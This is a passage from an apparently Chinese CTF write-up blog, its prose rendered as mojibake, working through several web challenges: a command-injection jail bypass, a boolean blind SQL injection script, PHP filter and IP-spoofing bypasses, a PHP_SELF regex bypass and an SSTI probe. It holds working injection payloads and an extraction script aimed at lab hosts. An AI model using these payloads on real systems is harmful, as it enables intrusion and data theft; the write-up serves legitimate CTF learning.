<p>ä¼šåŒ¹é…ä¸€ä¸ª%0aï¼Œä½†å¤šåœ¨payloadå‰ååŠ å‡ ä¸ª%0aå°±è¡Œäº†ã€‚<br><img src="/images/VD0G2K3MS8WJMY0.png" srcset="/img/loading.gif" lazyload><br><img src="/images/20201203222019541.png" srcset="/img/loading.gif" lazyload><br>çœ‹çœ‹ç°åœ¨èƒ½ä¸èƒ½è¡Œ</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;ls /&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/images/QC88QV83GL7BO.png" srcset="/img/loading.gif" lazyload><br>æ ¹ç›®å½•ä¸­æ²¡æœ‰flag<br>ç”¨findæŸ¥æ‰¾</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;find / -name flag*&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure>
<p>æ²¡æœ‰æŠ¥é”™ä½†ä¹Ÿæ²¡æœ‰æ˜¾ç¤ºï¼Œé‚£ä¹ˆè¯´è¿™ä¸ªç¯å¢ƒå˜é‡ä¸‹ä¹Ÿæ²¡æœ‰find</p>
<p><strong>Linuxå‘½ä»¤çš„ä½ç½®ï¼š&#x2F;bin,&#x2F;usr&#x2F;binï¼Œé»˜è®¤éƒ½æ˜¯å…¨ä½“ç”¨æˆ·ä½¿ç”¨ï¼Œ&#x2F;sbin,&#x2F;usr&#x2F;sbin,é»˜è®¤rootç”¨æˆ·ä½¿ç”¨</strong><br><img src="/images/Q2BO12RTCT42RURJXEVW.png" srcset="/img/loading.gif" lazyload><br>åœ¨&#x2F;usr&#x2F;binä¸‹æ‰¾åˆ°äº†find<br>è¿™æ ·æ¥ä½¿ç”¨</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;/usr/bin/find / -name flag*&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/images/KXA7MY8AXFZUXW.png" srcset="/img/loading.gif" lazyload><br>æ‰¾åˆ°äº†flagçš„è·¯å¾„<br><img src="/images/S73VKNZ1Z1VDVZYA.png" srcset="/img/loading.gif" lazyload><br>æ‰¾åˆ°catçš„è·¯å¾„</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/images/B4QC95042UQCY2WB.png" srcset="/img/loading.gif" lazyload><br>å†çœ‹çœ‹ç¯å¢ƒå˜é‡&#x2F;home&#x2F;rceservice&#x2F;jailä¸‹æœ‰ä»€ä¹ˆ<br><img src="/images/XKOFAHMGNI3P7XQAKZOOW.png" srcset="/img/loading.gif" lazyload><br>æ˜¯lsï¼Œè§£é‡Šäº†ä¸ºå•¥åˆšå¼€å§‹èƒ½ç”¨lsçš„åŸå› </p>
<h2 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h2><p>åªæœ‰ä¸€ä¸ªè¾“å…¥æ¡†<br>è¾“å…¥1<br>å›æ˜¾Hi admin, your score is: 100<br>æœ€å¤šè¾“åˆ°4<br>ç›²çŒœsqlæ³¨å…¥<br>è¾“å…¥</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>è¿™é‡Œå¦‚æœæ²¡æœ‰è¿‡æ»¤å­—ç¬¦oråº”è¯¥æ’ä¸ºçœŸçš„<br>æ˜¾ç¤ºstudent number not exists.<br>æœ‰å¯èƒ½ç©ºæ ¼æˆ–è€…orè¢«è¿‡æ»¤</p>
<p>å¤šè½®æµ‹è¯•è¿‡åå‘ç°ä»…ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œç”¨&#x2F;**&#x2F;ä»£æ›¿ç©ºæ ¼å³å¯<br>å°†oræ¢ä¸ºandï¼Œå› ä¸ºåªè¾“å…¥1ä¹Ÿå›æ˜¾ä¸ºtrueï¼Œandçš„åé¢ä¹Ÿä¸ºtrueæ‰èƒ½è¾¾åˆ°å¸ƒå°”ç›²æ³¨çš„ç›®çš„</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>and<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>å‘ç°è§„å¾‹ï¼Œå‘½ä»¤é”™è¯¯ä¼šæŠ¥é”™<br>ä½¿ç”¨å¸ƒå°”ç›²æ³¨<br>ç¼–å†™pythonè„šæœ¬æ–¹ä¾¿ä½¿ç”¨</p>
<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs hsp">import requests<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span> :<br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> True:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            mid = (low + high) <span class="hljs-comment">// 2</span><br>            <span class="hljs-meta"># payload = f&#x27;<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(ascii(substr((select<span class="hljs-comment">/**/</span>group_concat(schema_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>information_schema.schemata),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)%<span class="hljs-number">23</span>&#x27;</span><br>            <span class="hljs-meta"># payload = f&#x27;<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(ascii(substr((select<span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_schema=<span class="hljs-string">&quot;ctf&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)%<span class="hljs-number">23</span>&#x27;</span><br>            <span class="hljs-meta"># payload = f&#x27;<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(ascii(substr((select<span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&quot;flag&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)%<span class="hljs-number">23</span>&#x27;</span><br>            payload = f<span class="hljs-string">&#x27;1/**/and/**/if(ascii(substr((select/**/group_concat(value)/**/from/**/ctf.flag),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>            <span class="hljs-meta"># print(payload)</span><br>            url = f<span class="hljs-string">&quot;http://ac3f56f2-dc89-4ab5-a066-b6f2d94da972.node5.buuoj.cn:81/?stunum=&#123;payload&#125;&quot;</span><br>            <span class="hljs-meta">#print(url)</span><br>            <span class="hljs-meta"># data=&#123;</span><br>            <span class="hljs-meta"># <span class="hljs-string">&quot;&quot;</span>:f<span class="hljs-string">&quot;admin&#x27; and &#123;payload&#125;#&quot;</span>,</span><br>            <span class="hljs-meta">#</span><br>            <span class="hljs-meta"># &#125;</span><br>            r = requests.get(url=url)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;admin&#x27;</span> in r.text:<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            result += chr(low)<br>            <span class="hljs-keyword">print</span>(result)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>


<h2 id="MRCTF2020-å¥—å¨ƒ"><a href="#MRCTF2020-å¥—å¨ƒ" class="headerlink" title="[MRCTF2020]å¥—å¨ƒ"></a>[MRCTF2020]å¥—å¨ƒ</h2><p>æºä»£ç é‡Œæ˜¯æœ‰æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿çš„</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;!--<br><span class="hljs-regexp">//</span><span class="hljs-number">1</span>st<br><span class="hljs-variable">$query</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<span class="hljs-regexp">//</span>å¯ä»¥ç†è§£ä¸ºè·å–è¾“å…¥çš„å­—ç¬¦ä¿¡æ¯,è·å–çš„æ˜¯?åé¢çš„å€¼<br><br> <span class="hljs-keyword">if</span>( substr_count(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || substr_count(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;<span class="hljs-regexp">//</span>substr_countè·å–å­—ç¬¦çš„å‡ºç°æ¬¡æ•°<br>    die(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>);<br>&#125;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;<br>    echo <span class="hljs-string">&quot;you are going to the next ~&quot;</span>;<br>&#125;<br>!--&gt;<br></code></pre></td></tr></table></figure>
<p>å¼€å§‹ç»•<br>ä»–æ²¡æœ‰å¤§å°å†™çš„æ£€æµ‹%5fç”¨%5Fç»•è¿‡<br>ä»¥$ç»“å°¾ä¹Ÿæ²¡æœ‰ç¦ç”¨æ¢è¡Œç¬¦ï¼Œå°±ç”¨%0aç»•è¿‡<br>payload</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?b[u<span class="hljs-meta">%</span><span class="hljs-number">5</span>Fp<span class="hljs-meta">%</span><span class="hljs-number">5</span>Ft=<span class="hljs-number">23333</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure>
<p><img src="/images/H37HXSCW5QM6ZXX.png" srcset="/img/loading.gif" lazyload><br>è¿›å…¥å†æºä»£ç å‘ç°ä¸€ä¸ªåŠ å¯†ä¿¡æ¯<br>å¤åˆ¶ç²˜è´´åœ¨æ§åˆ¶å°é‡Œ<br><img src="/images/B8K9LNDE6H7CN95S.png" srcset="/img/loading.gif" lazyload><br>é‚£ä¹ˆPOST Merak,å€¼éšæ„</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>    <span class="hljs-keyword">die</span>(); <br>&#125; <br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123; <br>    <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>); <br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; <br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;<br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure>
<p>å‡ºç°äº†æ–°çš„æºç <br>ç¬¬ä¸€æ­¥æ˜¯ä¼ªé€ ip<br>æœ‰å¦‚ä¸‹å‡ ç§æ–¹å¼</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">Client</span>-ip:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Client-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Remote-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Rriginating-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Remote-addr:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">HTTP_CLIENT_IP</span>:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Real-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Originating-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">via</span>:<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure>
<p>æµ‹è¯•ä»…client-ipå¯ä»¥ä½¿ç”¨<br>headerä¸­æ·»åŠ client-ip<br>file_get_contentsç”¨phpä¼ªåè®®ç»•è¿‡</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">?<span class="hljs-number">2333</span>=php://<span class="hljs-built_in">input</span><br>pos<span class="hljs-variable">t:todat</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">a</span> happy day<br></code></pre></td></tr></table></figure>
<p>è¿™æ­¥å¼€å§‹ç”¨burpæ“ä½œï¼Œhackbaræœ‰ç‚¹é—®é¢˜</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl">function change($v)&#123; <br>    $v = base64_decode($v); <br>    $re = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($v);$i++)&#123; <br>        $re .= <span class="hljs-keyword">chr</span> ( <span class="hljs-keyword">ord</span> ($v[$i]) + $i*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> $re; <br>&#125;<br></code></pre></td></tr></table></figure>
<p>è¿™å—åå‘ç¼–è¯‘ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123;<br><br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) - <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> );<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/KZK2SNH27KTYEM6Y.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>ç‚¹å‡»sourceæŸ¥çœ‹æºç </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br>include <span class="hljs-string">&#x27;config.php&#x27;</span>; <span class="hljs-regexp">//</span> FLAG is defined <span class="hljs-keyword">in</span> config.php<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  highlight_file(basename(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$secret</span> = bin2hex(random_bytes(<span class="hljs-number">64</span>));<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$guess</span> = (string) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>  <span class="hljs-keyword">if</span> (hash_equals(<span class="hljs-variable">$secret</span>, <span class="hljs-variable">$guess</span>)) &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>  &#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
<p>ä»£ç å‘Šè¯‰äº†æˆ‘ä»¬flagåœ¨config.phpé‡Œ<br>ä½†æ˜¯ä¸‹é¢åˆè¿‡æ»¤äº†config.php&#x2F;<br>$_SERVER[â€˜PHP_SELFâ€™]è¿”å›çš„æ˜¯è·¯å¾„+è„šæœ¬å<br>ä¸‹é¢æœ‰ä¸€è¡Œä»£ç è¡¨ç¤ºå¯ä»¥ç›´æ¥è·å¾—flagï¼Œä½†è¦èƒ½å¤Ÿç ´è§£éšæœºæ•°å°±èƒ½å¾—åˆ°flagï¼Œè¿™ä¸ªéš¾åº¦å¤ªå¤§äº†ã€‚ã€‚</p>
<p>è¿™é‡Œæ˜¯æœ‰çªç ´ç‚¹çš„</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>æ³¨æ„è¿™é‡Œ&#x2F;config.php/*$æ˜¯åŒ¹é…äº†å°¾éƒ¨çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å°¾éƒ¨æ·»åŠ ä¸å¯æ˜¾å­—ç¬¦æ¥ç»•è¿‡æ­£åˆ™ï¼Œæ¯”å¦‚%ff</p>
<p>basename()<br>ä¼šè¿”å›è·¯å¾„é‡çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚æ¯”å¦‚&#x2F;index.php&#x2F;config.phpä½¿ç”¨basename()ä¹‹åè¿”å›config.phpã€‚<br>basename()ä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼ã€‚</p>
<p>è¿™é‡Œå†™ä¸€æ®µphpè¯­å¥æ¥ææ¸…æ¥š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-string">&#x27;index.php/config.php%ff?source&#x27;</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]);<br><br></code></pre></td></tr></table></figure>

<p><img src="/images/YVE0N5JFKM9LXPB.png" srcset="/img/loading.gif" lazyload><br>å› ä¸º$_SERVER[â€˜PHP_SELFâ€™]è¡¨ç¤ºå½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶åï¼Œå½“ä½¿ç”¨äº†PATH_INFOæ—¶ï¼Œè¿™ä¸ªå€¼æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥å¯ä»¥å°è¯•ç”¨&#x2F;index.php&#x2F;config.php&#x2F;%ff?sourceæ¥è¯»å–flagã€‚<br><img src="/images/RZX7CIEXRHL29BSAOH.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>é¢˜ç›®è¯´äº†æ˜¯å…³äºflaskçš„<br>æºä»£ç æœ‰æç¤ºå‚æ•°ä¸ºsearch<br>æ‰€ä»¥ç›´æ¥sstiæ³¨å…¥</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">2</span>*<span class="hljs-number">4</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
